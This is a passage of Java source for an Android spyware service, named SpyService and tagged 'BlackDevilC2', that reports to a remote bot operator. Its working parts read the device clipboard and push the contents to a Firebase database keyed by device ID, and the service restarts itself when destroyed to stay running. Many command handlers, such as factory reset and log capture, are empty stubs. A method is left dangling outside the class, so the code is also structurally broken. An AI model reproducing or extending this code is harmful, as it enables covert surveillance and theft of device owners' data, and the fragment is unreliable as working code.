    private void getMemoryInfo() { bot.sendMessage("🧠 معلومات الذاكرة – سيتم تنفيذه"); }
    private void getCpuInfo() { bot.sendMessage("⚡ معلومات المعالج – سيتم تنفيذه"); }
    private void getSensorInfo() { bot.sendMessage("📡 معلومات الحساسات – سيتم تنفيذه"); }
    private void getDisplayInfo() { bot.sendMessage("🖥️ معلومات الشاشة – سيتم تنفيذه"); }

    private void clipboardSet() {
        try {
            String text = "نص تجريبي من BlackDevilC2";
            clipboardManager.setText(text);
            bot.sendMessage("📋 تم كتابة النص في الحافظة");
        } catch (Exception e) { bot.sendMessage("❌ فشل الكتابة في الحافظة"); }
    }

    private void clipboardGet() {
        try {
            String text = clipboardManager.getText().toString();
            sendData("CLIPBOARD", text);
            bot.sendMessage("📋 محتوى الحافظة: " + text);
        } catch (Exception e) { bot.sendMessage("❌ فشل قراءة الحافظة"); }
    }

    private void copyLastResult() { bot.sendMessage("📋 نسخ النتيجة إلى الحافظة – سيتم تنفيذه"); }
    private void sendResultToBot() { bot.sendMessage("📤 إرسال النتيجة إلى البوت – سيتم تنفيذه"); }
    private void shareResult() { bot.sendMessage("📤 مشاركة النتيجة – سيتم تنفيذه"); }
    private void saveResultLocally() { bot.sendMessage("💾 حفظ النتيجة محلياً – سيتم تنفيذه"); }
    private void deleteResultFromFirebase() { bot.sendMessage("🗑️ حذف النتيجة من Firebase – سيتم تنفيذه"); }
    private void clearAllData() { bot.sendMessage("🗑️ مسح جميع بيانات التطبيق – سيتم تنفيذه"); }
    private void factoryReset() { bot.sendMessage("♻️ إعادة ضبط المصنع – يتطلب صلاحيات"); }
    private void getLogcat() { bot.sendMessage("📋 سجلات التطبيق – سيتم تنفيذه"); }

    // ========== دوال مساعدة ==========
    private void sendData(String key, String value) {
        dbRef.child("devices").child(deviceId).child("data").child(key).setValue(value);
        bot.sendMessage("📤 تم حفظ " + key + " في Firebase");
    }

    // ========== Service lifecycle ==========
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "SpyService destroyed, restarting...");
        startService(new Intent(this, SpyService.class));
    }
}

    private void copyToClipboard(String text) {
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        android.content.ClipData clip = android.content.ClipData.newPlainText("Result", text);
        clipboard.setPrimaryClip(clip);
        sendData("CLIPBOARD", "✅ تم نسخ النتيجة إلى الحافظة");
    }
